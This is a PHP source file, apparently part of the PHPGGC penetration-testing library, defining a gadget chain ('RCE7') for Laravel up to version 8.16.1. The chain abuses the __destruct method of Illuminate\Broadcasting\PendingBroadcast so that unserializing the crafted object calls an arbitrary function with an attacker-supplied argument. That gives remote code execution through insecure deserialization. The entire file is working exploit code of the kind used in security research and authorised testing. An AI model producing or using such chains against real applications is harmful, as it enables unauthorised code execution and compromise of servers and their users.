<?php

namespace GadgetChain\Laravel;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '? <= 8.16.1'; // will test for more version at a later date
    public static $vector = '__destruct';
    public static $author = 'whira';
    public static $information = 'This chain throws a RuntimeException immediately after code execution.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Broadcasting\PendingBroadcast(
            $function, 
            $parameter
        );
    }
}
